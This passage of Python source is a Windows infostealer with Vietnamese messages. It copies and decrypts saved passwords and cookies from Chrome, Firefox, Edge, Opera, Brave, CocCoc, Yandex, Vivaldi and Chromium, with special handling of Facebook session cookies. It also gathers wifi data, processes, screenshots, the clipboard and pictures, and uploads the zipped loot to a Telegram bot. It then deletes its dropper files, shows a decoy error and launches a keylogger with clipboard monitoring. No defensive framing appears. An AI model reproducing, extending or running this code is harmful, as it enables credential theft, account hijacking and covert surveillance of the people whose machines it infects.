            shutil.rmtree(os.path.join(data_firefox, "profile" + str(i)))
            
def get_yandex(data_path, yandex_path):
    data_yandex = os.path.join(data_path, "Yandex")
    os.mkdir(data_yandex)
    profiles = find_profile(yandex_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_yandex, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_yandex_running():
                    kill_yandex()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_yandex, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_yandex, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_yandex, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(yandex_path, 'Local State')):
                            shutil.copyfile(os.path.join(yandex_path, 'Local State'), os.path.join(data_yandex, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break  
        copy_file()
        encrypted_file(os.path.join(data_yandex, "profile" + str(i)))

def get_vivaldi(data_path, vivaldi_path):
    data_vivaldi = os.path.join(data_path, "Vivaldi")
    os.mkdir(data_vivaldi)
    profiles = find_profile(vivaldi_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_vivaldi, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_vivaldi_running():
                    kill_vivaldi()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_vivaldi, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_vivaldi, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_vivaldi, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(vivaldi_path, 'Local State')):
                            shutil.copyfile(os.path.join(vivaldi_path, 'Local State'), os.path.join(data_vivaldi, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break  
        copy_file()
        encrypted_file(os.path.join(data_vivaldi, "profile" + str(i)))
            
def encrypt(data_profile):
    login_db = os.path.join(data_profile, "Login Data")
    key_db = os.path.join(data_profile ,"Local State")
    cookie_db = os.path.join(data_profile, "Cookies")
    credit_db = os.path.join(data_profile, "Web Data")
    with open(key_db, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    master_key_str = str(master_key)
    try:
        conn = sqlite3.connect(login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        facebook_passwords = []
        other_passwords = []
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_password = decrypted_pass[:-16].decode()
            if "facebook.com" in url:
                facebook_passwords.append(f"\n🔗 URL: {url}\n🆔 Username: {username} | 🔑 Password: {decrypted_password}\n")
            else:
                other_passwords.append(f"\n🔗 URL: {url}\n🆔 Username: {username} | 🔑 Password: {decrypted_password}\n")
        with open(os.path.join(data_profile, "password.txt"), 'a', encoding='utf-8') as f:
            f.writelines(facebook_passwords)
            f.writelines(other_passwords)
    except:
        pass
    def decrypt_data(data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    try:    
        conn2 = sqlite3.connect(cookie_db)
        conn2.text_factory = lambda b: b.decode(errors="ignore")
        cursor2 = conn2.cursor()
        cursor2.execute("""
        SELECT host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc
        FROM cookies
        """)
        facebook_cookies = []
        other_cookies = []
        json_data = []
        for host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc in cursor2.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, master_key)
            else:
                decrypted_value = value
            if host_key == ".facebook.com":
                facebook_cookies.append(f"{name} = {decrypted_value}")
            else:
                other_cookies.append(f"{host_key}\t{is_httponly}\t{'/'}\t{is_secure}\t\t{name}\t{decrypted_value}\n")
        result_string_facebook = "; ".join(facebook_cookies)
        result_string_other = "".join(other_cookies)
        with open(os.path.join(data_profile, "cookie.txt"), 'a') as f:
            f.write(result_string_other)
        with open(os.path.join(os.environ["TEMP"], name_file, "cookie_fb.txt"), 'a', encoding='utf-8') as f:
            f.write(result_string_facebook + "\n\n")
    except:
        pass
        
def encrypted_file(data_profile):
    try:
        encrypt(data_profile)
    except:pass
           
def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
  hp = sha1( globalSalt ).digest()
  pes = entrySalt + b'\x00'*(20-len(entrySalt))
  chp = sha1( hp+entrySalt ).digest()
  k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
  tk = hmac.new(chp, pes, sha1).digest()
  k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
  k = k1+k2
  iv = k[-8:]
  key = k[:24]
  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

def decodeLoginData(data):
  asn1data = decoder.decode(b64decode(data))
  key_id = asn1data[0][0].asOctets()
  iv = asn1data[0][1][1].asOctets()
  ciphertext = asn1data[0][2].asOctets()
  return key_id, iv, ciphertext 

def getLoginData(afkk):
  logins = []
  json_file = os.path.join(afkk ,"logins.json")
  loginf = open( json_file, 'r',encoding='utf-8').read()
  jsonLogins = json.loads(loginf)
  for row in jsonLogins['logins']:
    encUsername = row['encryptedUsername']
    encPassword = row['encryptedPassword']
    logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )
  return logins

def decryptPBE(decodedItem, globalSalt): 
  pbeAlgo = str(decodedItem[0][0][0])
  if pbeAlgo == '1.2.840.113549.1.12.5.1.3': 
    entrySalt = decodedItem[0][0][1][0].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )
    return key[:24]
  elif pbeAlgo == '1.2.840.113549.1.5.13':  
    entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
    iterationCount = int(decodedItem[0][0][1][0][1][1])
    keyLength = int(decodedItem[0][0][1][0][1][2])
    k = sha1(globalSalt).digest()
    key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    
    iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
    cipherT = decodedItem[0][1].asOctets()
    clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
    return clearText

def getKey(afk):  
    conn = sqlite3.connect(os.path.join(afk, "key4.db"))
    c = conn.cursor()
    c.execute("SELECT item1,item2 FROM metadata;")
    row = c.fetchone()
    globalSalt = row[0] 
    item2 = row[1]
    decodedItem2 = decoder.decode( item2 ) 
    clearText = decryptPBE( decodedItem2, globalSalt )
    if clearText == b'password-check\x02\x02': 
      c.execute("SELECT a11,a102 FROM nssPrivate;")
      for row in c:
        if row[0] != None:
            break
      a11 = row[0]
      a102 = row[1] 
      if a102 != None: 
        decoded_a11 = decoder.decode( a11 )
        clearText= decryptPBE( decoded_a11, globalSalt )
        return clearText[:24]   
    return None

def encrypt_firefox(path_f):
    try:
        if os.path.exists(os.path.join(path_f, "logins.json")):
            key = getKey(path_f)
            logins = getLoginData(path_f)
            facebook_logins = []
            other_logins = []
            for i in logins:
                username = unpad(DES3.new(key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]), 8)
                password = unpad(DES3.new(key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]), 8)
                str_pass = password.decode('utf-8')
                str_user = username.decode('utf-8')
                if i[2] == ".facebook.com":
                    facebook_logins.append(f"\n{i[2]}\n{str_user} | {str_pass}\n")
                else:
                    other_logins.append(f"\n🔗 {i[2]}\n🆔 Username: {str_user} | 🔑 Password: {str_pass}\n")
            with open(os.path.join(path_f, "password.txt"), 'a', encoding='utf-8') as f:
                f.writelines(facebook_logins)
                f.writelines(other_logins)
    except:
        pass
    try:
        db_path = os.path.join(path_f, "cookies.sqlite")
        db = sqlite3.connect(db_path)
        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()
        cursor.execute("""
        SELECT id, name, value, host
        FROM moz_cookies
        """)
        facebook_cookies = []
        other_cookies = []
        for id, name, value, host in cursor.fetchall():
            if host == ".facebook.com":
                facebook_cookies.append(f"{name} = {value}")
            else:
                cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"
                other_cookies.append(cookie)
        
        with open(os.path.join(path_f, "cookie.txt"), 'a') as f:
            f.writelines(other_cookies)

        result_string_facebook = "; ".join(facebook_cookies)
        with open(os.path.join(os.environ["TEMP"], name_file, "cookie_fb.txt"), 'a', encoding='utf-8') as f:
            f.write(result_string_facebook + "\n\n")
    except:
        pass
        
def encrypted_firefox(data_firefox_profile):
    try:
        encrypt_firefox(data_firefox_profile)
    except: pass
   
def check_execution_count():
    number_file_path = r'C:\Users\Public\number.txt'
    if os.path.exists(number_file_path):
        with open(number_file_path, 'r') as file:
            count = int(file.read().strip())
    else:
        count = 0
    count += 1
    with open(number_file_path, 'w') as file:
        file.write(str(count))
    if count >= 2:
        ctypes.windll.user32.MessageBoxW(0, "Nghiêm cấm spam", "Warning", 0x40 | 0x1)
        sys.exit()
    return count 

def get_zip_info(zip_path):
    temp_dir = os.path.join(os.environ["TEMP"], "temp_zip_extraction")
    os.makedirs(temp_dir, exist_ok=True)
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)
    directory_structure = {}
    txt_files = {} 
    for root, dirs, files in os.walk(temp_dir):
        current_dir = directory_structure
        path_parts = os.path.relpath(root, temp_dir).split(os.sep)
        for part in path_parts:
            if part not in current_dir:
                current_dir[part] = {}
            current_dir = current_dir[part]
        for file in files:
            if file.endswith('.txt'):
                file_path = os.path.join(root, file)
                file_size = os.path.getsize(file_path)
                txt_files[file] = file_size
    shutil.rmtree(temp_dir)
    return directory_structure, sorted(txt_files.items(), key=lambda x: x[0])

def format_directory_structure(directory_structure, level=0):
    indent = '  ' * level
    result = []
    for folder, contents in directory_structure.items():
        result.append(f"{indent}- {folder}")
        if isinstance(contents, dict):
            result.extend(format_directory_structure(contents, level + 1))
    return result

def check_VN():
    response = requests.get("https://ipinfo.io").text
    geolocation_tracking = json.loads(response)
    return geolocation_tracking['country']    
    
def main():
    so = check_execution_count()
    number = "Số lần spam: " + str(so) + " lần"
    send_telegram_message(bot_token, ID_chat, "🎭🔊 Bắt đầu thực hiện....")
    send_screenshot_to_telegram()
    system_info = get_system_info()
    send_system_info_to_telegram(bot_token, ID_chat, system_info)
    send_clipboard_to_telegram(bot_token, ID_chat)
    send_pictures_zip_to_telegram() 
    u1 = 'https://api.telegram.org/bot'+bot_token+'/sendDocument'
    data_path = os.path.join(os.environ["TEMP"], name_file);os.mkdir(data_path)
    process_list = os.path.join(os.environ["TEMP"], name_file,"process_list.txt")
    user_argent = os.path.join(os.environ["TEMP"], name_file,"user_argent.txt")
    cookiefb =  os.path.join(os.environ["TEMP"], name_file, "cookie_fb.txt")
    wifi_info_path = os.path.join(data_path, "wifi.txt")
    get_wifi_info(wifi_info_path)
    try:
        folder_names = []
        for entry in os.scandir(r'C:\Program Files\Google\Chrome\Application'):
            if entry.is_dir():
                folder_names.append(entry.name)
        with open(user_argent, 'w') as file:
            for folder_name in folder_names:
                file.write(folder_name + '\n')
    except:pass
    try:
        result = os.popen('tasklist').read()
        with open(process_list, 'w') as file:
            file.write(result)
    except :
        pass
    Chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    Firefox = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming","Mozilla", "Firefox", "Profiles")
    Edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
    Opera = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
    Brave = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","BraveSoftware", "Brave-Browser", "User Data")
    Coccoc = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","CocCoc", "Browser", "User Data")
    Chromium = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Chromium", "User Data")
    Yandex = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data")
    Vivaldi = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data")
    
    if os.path.exists(Chrome):
        try:
            get_chrome(data_path,Chrome)
        except: pass
    if os.path.exists(Edge):
        try:
            get_edge(data_path,Edge)
        except: pass
    if os.path.exists(Opera):
        try:
            get_opera(data_path,Opera)
        except: pass
    if os.path.exists(Brave):
        try:
            get_brave(data_path,Brave)
        except: pass
    if os.path.exists(Coccoc):
        try:
             get_coccoc(data_path,Coccoc)
        except: pass
    if os.path.exists(Firefox):
        try:
             get_firefox(data_path,Firefox)
        except: pass
    if os.path.exists(Chromium):
        try:
           get_chromium(data_path,Chromium)  
        except: pass
    if os.path.exists(Yandex):
        try:
           get_yandex(data_path,Yandex)  
        except: pass
    if os.path.exists(Vivaldi):
        try:
           get_vivaldi(data_path,Vivaldi)  
        except: pass
    cookies=[]
    with open(cookiefb, 'r') as file:
        for line in file:
            cleaned_line = line.strip()
            if cleaned_line != '':
                cookies.append(cleaned_line)
    for cookie in cookies:
        try:
            api = Aggregation(cookie)
            api.main()
        except:pass
    file_zip = os.path.join(os.environ["TEMP"], name_file +'.zip')
    shutil.make_archive(file_zip[:-4], 'zip', data_path)
    directory_structure, txt_files = get_zip_info(file_zip)
    caption = "\n🌍 Địa điểm: " + city + "_" + region_name + " " + f"({country_code})" + "\n\n🌐 IP Address: " + ip + "\n\n🖥 Computer name: " + hostname + "/" + machine_name + "\n\n🔢 " + number
    if directory_structure:
        caption += "\n\n📂 Thư mục:\n" + "\n".join(format_directory_structure(directory_structure))
    if txt_files:
        caption += "\n\n📄 Tệp:\n" + "\n".join(f"  - {file} (size: {size} bytes)" for file, size in txt_files)
    with open(file_zip, 'rb') as f:
        requests.post(u1,data={'caption': caption,'chat_id': ID_chat}, files={'document': f})
for i in range(1):
    main()
    if os.path.exists(r'C:\Users\Public\pub.bat'):
        os.remove(r'C:\Users\Public\pub.bat')
    if os.path.exists(r'C:\Users\Public\publicc.bat'):
        os.remove(r'C:\Users\Public\publicc.bat')
    if os.path.exists(r'C:\Users\Public\Document.zip'):
        os.remove(r'C:\Users\Public\Document.zip') 
    send_screenshot_to_telegram()
    send_telegram_message(bot_token, ID_chat, "....Thực hiện hoàn tất..! ✅🎉 ")
    show_error_message()
    start_keylogger()
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.start()
    send_keylog_thread = threading.Thread(target=send_keylog_to_telegram)
    send_keylog_thread.start()
